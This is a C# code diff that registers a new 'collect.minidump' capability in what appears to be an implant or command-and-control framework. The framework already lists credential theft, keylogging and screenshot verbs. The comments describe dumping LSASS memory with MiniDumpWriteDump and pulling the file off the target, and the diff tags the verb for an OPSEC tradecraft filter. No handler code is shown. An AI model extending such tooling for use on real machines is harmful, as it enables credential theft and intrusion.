@@ -33,6 +33,14 @@ public static class CollectCapabilities
     /// </summary>
     public const string Screenshot = "collect.screenshot";
 
+    /// <summary>
+    /// Write a full-memory minidump of a target process (the reference
+    /// handler targets LSASS, the credential-analysis shape): the documented
+    /// dbghelp MiniDumpWriteDump administration path. Windows-only; the
+    /// dumped file lands on the target and rides out via file.pull.
+    /// </summary>
+    public const string Minidump = "collect.minidump";
+
     // The OPSEC attributes flagging what each collect verb reads, so a
     // tradecraft filter can surface or suppress it (architecture.md Sec 7).
     private static readonly IReadOnlyDictionary<string, string> ReadsCredential =
@@ -54,6 +62,13 @@ public static class CollectCapabilities
             ["reads-screen"] = "true",
         };
 
+    private static readonly IReadOnlyDictionary<string, string> ReadsProcessMemory =
+        new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+        {
+            ["reads-credential"] = "true",
+            ["writes-to-disk"] = "true",
+        };
+
     /// <summary>
     /// Descriptors for every collect verb, in declared order. The composition
     /// root registers these so the registry lists the full collect set.
@@ -63,11 +78,12 @@ public static class CollectCapabilities
         CapabilityDescriptor.Of(Cred, CapabilityCategory.Collect, "1.0", ReadsCredential),
         CapabilityDescriptor.Of(Keylog, CapabilityCategory.Collect, "1.0", ReadsInputAndPersists),
         CapabilityDescriptor.Of(Screenshot, CapabilityCategory.Collect, "1.0", ReadsScreen),
+        CapabilityDescriptor.Of(Minidump, CapabilityCategory.Collect, "1.0", ReadsProcessMemory),
     };
 
     /// <summary>Every collect verb string, in declared order.</summary>
     public static readonly string[] Verbs =
     {
-        Cred, Keylog, Screenshot,
+        Cred, Keylog, Screenshot, Minidump,
     };
 }
